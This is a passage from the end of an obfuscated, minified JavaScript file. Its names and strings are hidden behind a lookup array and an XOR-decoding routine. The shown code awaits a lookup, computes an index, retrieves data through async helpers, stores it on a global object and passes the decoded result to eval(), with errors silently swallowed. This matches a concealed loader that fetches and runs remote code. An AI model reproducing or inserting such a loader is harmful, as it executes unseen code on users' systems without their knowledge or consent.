_$it_162c_3[_$_7134[0x33]]){_$it_162c_3[_$_7134[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_7134[0x34]]}}}}})();return (function(n){var r=c[_$_7134[0x10]];var e=_$_7134[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_7134[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_7134[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_7134[0x47]][_$_7134[0x46]](n[_$_7134[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_7134[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_7134[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_7134[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_7134[0x4a],parseInt(__jso_block_param_2_p[_$_7134[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_7134[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
